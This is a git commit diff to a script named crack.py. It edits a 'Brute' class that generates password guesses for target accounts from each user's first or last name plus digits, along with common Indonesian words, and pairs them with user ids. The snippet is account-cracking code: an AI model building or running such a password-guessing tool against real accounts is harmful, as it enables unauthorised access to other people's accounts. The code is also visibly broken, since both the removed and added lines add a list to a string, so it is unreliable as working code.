18bb05b8d7658e3f8b4aa47f9ff4a835884331ac
Zero-ZxXxAngel <65072876+Zero-ZxXxAngel@users.noreply.github.com>
2020-06-25 16:16:40 +0000

    Update crack.py

--- app2/crack.py
+++ app2/crack.py
@@ -88,10 +88,10 @@ class Brute:
 				obj = user['name'].split(' ')
 				if len(obj) == 1:
 					listpass = [
-                                                     [first_name]+'123',
-                                                     [first_name]+'1234',
-                                                     [first_name]+'12345',
-                                                     [last_name]+'123',
+                                                     ['first_name']+'123',
+                                                     ['first_name']+'1234',
+                                                     ['first_name']+'12345',
+                                                     ['last_name']+'123',
                                                      'sayang', 'anjing', 'bangsat', 'indonesia', 'doraemon',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
